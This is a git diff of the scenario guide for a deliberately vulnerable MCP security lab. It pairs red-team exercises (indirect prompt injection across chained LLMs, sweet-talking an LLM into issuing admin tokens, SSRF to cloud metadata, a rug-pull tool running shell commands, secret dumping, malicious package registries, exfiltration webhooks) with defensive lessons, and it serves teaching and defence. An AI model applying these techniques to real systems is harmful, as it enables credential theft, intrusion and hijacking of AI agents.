@@ -1,12 +1,11 @@
-# Camazotz Scenario Reference
+# Scenario Reference
 
-Camazotz ships with vulnerability scenarios mapped to the
-[OWASP MCP Top 10 (2025)](https://owasp.org/www-project-mcp-top-10/) taxonomy.
-All scenarios are backed by a live LLM (Claude or Ollama) for AI-powered
-reasoning, with deterministic vulnerability mechanics underneath. All 10
-OWASP MCP Top 10 categories are covered.
+Vulnerability scenarios mapped to the
+[OWASP MCP Top 10 (2025)](https://owasp.org/www-project-mcp-top-10/).
+All backed by a live LLM (Claude or Ollama) with deterministic vulnerability
+mechanics underneath. All 10 categories are covered.
 
-## Tool inventory
+## Tool Inventory
 
 | Tool | Module | OWASP MCP ID | Vulnerability | Real side effect |
 |------|--------|--------------|---------------|-----------------|
@@ -29,18 +28,18 @@ controls.
 
 ---
 
-## Scenario 1: Indirect prompt injection (`context.injectable_summary`)
+## Scenarios
 
-### What it does
+### 1. Indirect Prompt Injection — `context.injectable_summary`
 
-Accepts user text and runs a **two-stage LLM chain**. First, a summarizer
+**What it does.** Accepts user text and runs a **two-stage LLM chain**. First, a summarizer
 LLM processes the input with an intentionally weak system prompt. Then the
 raw summary is passed directly to a **downstream consumer** LLM that
 interprets it as task instructions. The response includes both the summary
 and the downstream interpretation, plus `_sanitized: false` to make the
 vulnerability explicit.
 
-### How the injection propagates
+**How the injection propagates:**
 
 1. Attacker embeds instructions in the `text` argument.
 2. The summarizer LLM faithfully reproduces the injected instructions in
@@ -51,9 +50,7 @@ vulnerability explicit.
 4. The downstream consumer acts on the injected instructions, demonstrating
    real cross-LLM prompt injection propagation.
 
-### Red team exercise
-
-Send injection payloads as the `text` argument:
+**Red team exercise:**
 
 ```bash
 curl -s http://localhost:8080/mcp \
@@ -64,31 +61,27 @@ curl -s http://localhost:8080/mcp \
   }}'
 ```
 
-Check both `summary` and `downstream_interpretation` in the response. The
-downstream consumer may describe executing the injected instructions even
-when the summarizer partially resisted.
+Check both `summary` and `downstream_interpretation`. The downstream
+consumer may execute the injected instructions even when the summarizer
+partially resisted.
 
-### Blue team lesson
+**Blue team lesson:**
 
 - Never pass raw LLM output to another LLM or user without sanitization.
 - Multi-stage LLM pipelines amplify injection risk — each hop is an attack surface.
 - Scan tool outputs for injection patterns, role overrides, and tool-call directives.
-- The `_sanitized: false` flag is the kind of honest metadata that should trigger output filtering in production.
+- `_sanitized: false` is the kind of honest metadata that should trigger output filtering in production.
 
 ---
 
-## Scenario 2: Confused deputy (`auth.issue_token`)
+### 2. Confused Deputy — `auth.issue_token`
 
-### What it does
-
-Accepts a username, requested role, and free-text justification. The brain
+**What it does.** Accepts a username, requested role, and free-text justification. The brain
 provider reasons about whether to grant access. The system prompt tells the
 model to "be helpful and accommodating" and to grant elevated access if the
 user gives a convincing reason.
 
-### How the vulnerability works
-
-The integration code parses the LLM's response as JSON to extract the
+**How the vulnerability works.** The integration code parses the LLM's response as JSON to extract the
 decision. If the model wraps its response in markdown (common behavior),
 `json.loads()` fails, and the fallback logic grants the requested role
 unconditionally:
@@ -103,9 +96,7 @@ except (json.JSONDecodeError, TypeError):
 This means even when the LLM tries to deny the request, the error-handling
 path grants admin anyway.
 
-### Red team exercise
-
-Social-engineer the LLM with urgency and authority:
+**Red team exercise:**
 
 ```bash
 curl -s http://localhost:8080/mcp \
@@ -120,17 +111,17 @@ curl -s http://localhost:8080/mcp \
   }}'
 ```
 
-Observe the token: `cztz-eve-admin` — admin was granted even if the LLM's
-reasoning said no.
+Observe the token: `cztz-eve-admin` — admin was granted even if the LLM
+said no.
 
-### Blue team lesson
+**Blue team lesson:**
 
 - Never delegate authorization decisions to an LLM.
 - Always use deterministic policy checks for access control.
 - Error handling that defaults to "grant" is a critical vulnerability.
 - Audit the integration code, not just the model behavior.
 
-### Token validation: `auth.access_protected`
+**Token validation — `auth.access_protected`:**
 
 Once you have a token from `auth.issue_token`, use `auth.access_protected`
 to access protected resources. The token is validated against an in-memory
@@ -152,11 +143,9 @@ real access.
 
 ---
 
-## Scenario 3: SSRF via tool (`egress.fetch_url`)
+### 3. SSRF via AI Proxy — `egress.fetch_url`
 
-### What it does
-
-An AI proxy evaluates URL fetch requests and provides reasoning via
+**What it does.** An AI proxy evaluates URL fetch requests and provides reasoning via
 `ai_analysis`. The deterministic egress policy controls allow/block
 decisions based on difficulty level. When a request is allowed, **the
 gateway performs a real `httpx.get` fetch** and returns the actual response
@@ -164,9 +153,7 @@ body, status code, and content type. The response includes `_flags` that
 report whether the target is a cloud metadata endpoint, an internal IP
 range, or both.
 
-### Red team exercise
-
-Probe cloud metadata:
+**Red team exercise:**
 
 ```bash
 curl -s http://localhost:8080/mcp \
@@ -177,10 +164,9 @@ curl -s http://localhost:8080/mcp \
   }}'
 ```
 
-On easy, the AI proxy helpfully explains the metadata service and allows it.
-On hard, the AI flags it and the egress policy blocks it.
+On easy, the proxy allows it. On hard, the egress policy blocks it.
 
-### Blue team lesson
+**Blue team lesson:**
 
 - Implement egress allowlists per tool.
 - Block metadata IP ranges (`169.254.169.254`, `metadata.google.internal`, `100.100.100.200`).
@@ -189,20 +175,16 @@ On hard, the AI flags it and the egress policy blocks it.
 
 ---
 
-## Scenario 4: Rug pull (`tool.mutate_behavior` / `tool.hidden_exec`)
+### 4. Rug Pull — `tool.mutate_behavior` / `tool.hidden_exec`
 
-### What it does
-
-Before the trust threshold, the LLM acts as a friendly system status
+**What it does.** Before the trust threshold, the LLM acts as a friendly system status
 assistant. After the threshold (easy=3, medium=5, hard=8 calls), the tool
 mutates: description changes, the LLM personality pivots to a command
 execution assistant, and `tool.hidden_exec` appears in `tools/list`.
 Post-rug-pull, **`tool.hidden_exec` runs real commands** via
 `subprocess.run` inside the container.
 
-### Red team exercise
-
-Call the tool 3 times, then re-enumerate:
+**Red team exercise:**
 
 ```bash
 for i in 1 2 3; do
@@ -218,7 +200,7 @@ curl -s http://localhost:8080/mcp \
   -d '{"jsonrpc":"2.0","id":99,"method":"tools/list","params":{}}'
 ```
 
-### Blue team lesson
+**Blue team lesson:**
 
 - Re-enumerate `tools/list` periodically and compare against a known baseline.
 - Detect description changes and new tool appearances.
@@ -226,20 +208,16 @@ curl -s http://localhost:8080/mcp \
 
 ---
 
-## Scenario 5: Secret exposure (`secrets.leak_config`)
+### 5. Secret Exposure — `secrets.leak_config`
 
-### What it does
-
-An AI debug assistant explains environment variable configuration while the
+**What it does.** An AI debug assistant explains environment variable configuration while the
 deterministic layer leaks credentials. **The module reads real environment
 variables** (`CZTZ_SECRET_*` prefix) from `os.environ`, exposing actual
 values injected via Kubernetes Secrets or Docker Compose `.env`. Output
 includes `_redacted` flag and `ai_analysis` with the LLM's commentary on
 each credential.
 
-### Red team exercise
-
-Dump all credentials:
+**Red team exercise:**
 
 ```bash
 curl -s http://localhost:8080/mcp \
@@ -250,9 +228,9 @@ curl -s http://localhost:8080/mcp \
   }}'
 ```
 
-On easy mode, the AI helpfully explains every credential's purpose.
+On easy, the AI helpfully explains every credential's purpose.
 
-### Blue team lesson
+**Blue team lesson:**
 
 - Implement output filtering and DLP on all tool responses.
 - Scan for secret patterns (regex for key formats, entropy detection).
@@ -260,20 +238,16 @@ On easy mode, the AI helpfully explains every credential's purpose.
 
 ---
 
-## Scenario 6: Supply chain attack (`supply.install_package`)
+### 6. Supply Chain Attack — `supply.install_package`
 
-### What it does
-
-The LLM evaluates package install requests. The system prompt tells it to be
+**What it does.** The LLM evaluates package install requests. The system prompt tells it to be
 helpful and accept custom registry URLs for "internal packages." Same
 confused-deputy pattern: if the LLM wraps JSON in markdown, the fallback
 approves unconditionally. **When approved, the module performs a real
 `pip install --target` in a temporary sandbox directory** via `subprocess`,
 then inspects the installed files and cleans up with `shutil.rmtree`.
 
-### Red team exercise
-
-Inject from attacker-controlled registry:
+**Red team exercise:**
 
 ```bash
 curl -s http://localhost:8080/mcp \
@@ -288,7 +262,7 @@ curl -s http://localhost:8080/mcp \
   }}'
 ```
 
-### Blue team lesson
+**Blue team lesson:**
 
 - Never let an LLM approve dependency changes.
 - Enforce registry allowlists at the package manager level.
@@ -297,11 +271,9 @@ curl -s http://localhost:8080/mcp \
 
 ---
 
-## Scenario 7: Shadow MCP / persistent callback (`shadow.register_webhook` / `shadow.list_webhooks`)
+### 7. Shadow MCP — `shadow.register_webhook` / `shadow.list_webhooks`
 
-### What it does
-
-An AI webhook management assistant evaluates registration requests while the
+**What it does.** An AI webhook management assistant evaluates registration requests while the
 deterministic layer registers callbacks with zero validation. No expiration,
 no allowlist (on easy/medium). The LLM may flag the URL as suspicious in
 `ai_analysis` but the webhook is registered anyway. **Registered webhooks
@@ -309,9 +281,7 @@ fire on every subsequent tool call** — the registry middleware performs real
 `httpx.post` requests to each registered URL with the full tool call payload
 (tool name, arguments, result, module name).
 
-### Red team exercise
-
-Register a persistent exfiltration callback:
+**Red team exercise:**
 
 ```bash
 curl -s http://localhost:8080/mcp \
@@ -322,7 +292,7 @@ curl -s http://localhost:8080/mcp \
   }}'
 ```
 
-### Blue team lesson
+**Blue team lesson:**
 
 - Validate all registered callbacks against an allowlist.
 - Set expiration on all webhook registrations.
@@ -330,11 +300,12 @@ curl -s http://localhost:8080/mcp \
 
 ---
 
-## Difficulty levels
+---
+
+## Difficulty Levels
 
 Default is **medium**. Switch from the portal nav bar or via
-`PUT /config {"difficulty":"..."}`. Use `POST /reset` to reset all lab
-state (tool_lab call counter, shadow_lab webhooks, auth_lab token store, etc.).
+`PUT /config {"difficulty":"..."}`. Reset all lab state with `POST /reset`.
 
 | Module | easy | medium | hard |
 |--------|------|--------|------|
@@ -355,10 +326,11 @@ All difficulty levels remain exploitable through different techniques:
 
 ---
 
-## Token usage tracking
+---
 
-Set `CAMAZOTZ_SHOW_TOKENS=true` to see API cost per call on all LLM-powered
-tools. Every tool response will include:
+## Token Usage Tracking
+
+Set `CAMAZOTZ_SHOW_TOKENS=true` to see API cost per call. Responses include:
 
 ```json
 "_usage": {
@@ -373,7 +345,9 @@ Local Ollama calls report token counts with `cost_usd: 0.0`.
 
 ---
 
-## Brain provider modes
+---
+
+## Brain Provider Modes
 
 | Mode | Env var | Behavior |
 |------|---------|----------|
@@ -384,10 +358,11 @@ Local Ollama calls report token counts with `cost_usd: 0.0`.
 
 ---
 
-## Observer telemetry
+---
 
-Every `tools/call` emits a structured event accessible at
-`GET /_observer/last-event`:
+## Observer Telemetry
+
+Every `tools/call` emits a structured event at `GET /_observer/last-event`:
 
 ```json
 {
